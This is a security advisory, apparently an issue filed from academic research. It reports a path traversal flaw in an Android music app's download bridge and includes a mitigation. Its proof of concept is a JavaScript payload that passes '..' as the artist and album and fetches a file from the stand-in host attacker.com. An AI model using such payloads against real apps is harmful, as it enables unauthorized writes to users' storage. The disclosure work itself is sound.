# Path Traversal in Download Service via Insufficient Path Sanitization

## Detection note

This issue was identified through automated LLM-based static analysis of WebView `addJavascriptInterface` bridges, as part of academic security research at the University of Southern Denmark (SDU) in the context of a masters level course named Engineering in Research.

The finding was manually reviewed before submission.

To aid the purposes of our research, we would kindly request acknowledgement of the reported issue as well as a final verdict from the open source community working on this repository, even if the issue is not acted on.

We are reporting in good faith and are happy to answer questions.

## Summary

The `download()` `@JavascriptInterface` method accepts track metadata from the LMS web page and constructs file system paths from artist, album, and filename fields. The `fatSafe()` sanitization method strips special characters (`[?<>\\:*|"/]`) but does not strip or normalize `..` sequences. A malicious or compromised LMS server can supply path components such as `../../sdcard/evil` that pass through unmodified and are used directly in `new File(baseDir, folder)`, potentially writing files outside the intended music directory.

**Severity:** Medium
**Affected version(s):** v0.9.2 (latest at time of analysis)

---

## Affected file(s)

- `lms-material/src/main/java/com/craigd/lmsmaterial/app/DownloadService.java` — `fatSafe()` (line 87–89), `getFolder()` (line 143–155), `File` construction (line 458–465)
- `lms-material/src/main/java/com/craigd/lmsmaterial/app/MainActivity.java` — `download()` `@JavascriptInterface` entry point (line 920–928)

---

## Vulnerable code

```java
// fatSafe() strips special chars but NOT ".." sequences
private static String fatSafe(String str) {
    return str.replaceAll("[?<>\\\\:*|\"/]", "");
}

// getFolder() uses fatSafe() output directly in path construction
// File construction — path traversal possible when folder contains ".."
File resolved = new File(baseDir, folder);
```

---

## Proof of concept

```js
// From a malicious or compromised LMS server web response:
NativeReceiver.download(JSON.stringify([{
  "artist": "..",
  "album": "..",
  "filename": "payload.txt",
  "url": "http://attacker.com/payload.txt"
}]));
```

This would construct a path like `<Music>/../../../payload.txt`, writing outside the intended music directory.

---

## Impact

If the LMS server is compromised or malicious, it can supply track metadata containing `..` path components. The app would then write downloaded content outside the intended music directory to any location on external storage that the app has write access to. Exploitability is bounded by the trust boundary of the LMS server — in a normal home network deployment the LMS server is trusted, but the missing sanitization is a hardening gap.

---

## Suggested mitigation

After calling `fatSafe()`, resolve the canonical path and verify it remains within the intended base directory:

```java
File resolved = new File(baseDir, folder).getCanonicalFile();
if (!resolved.getPath().startsWith(baseDir.getCanonicalPath() + File.separator)) {
    throw new SecurityException("Path traversal detected");
}
```

Alternatively, reject any path component containing `..` before path construction.
